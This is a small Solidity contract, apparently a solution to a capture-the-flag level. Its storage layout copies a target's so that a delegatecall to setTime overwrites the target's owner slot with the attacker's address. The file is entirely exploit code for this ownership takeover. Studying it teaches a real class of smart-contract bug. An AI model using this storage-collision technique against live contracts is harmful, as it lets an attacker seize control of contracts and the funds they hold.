// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract PreservationTakeOver {
  address public _slot1;
  address public _slot2;
  address public owner;
  uint storedTime;
  address public attacker;

  constructor () {
    attacker = msg.sender;    
  }

  function setTime(uint _time) public {
    owner = attacker;
    storedTime = _time;
  }
}
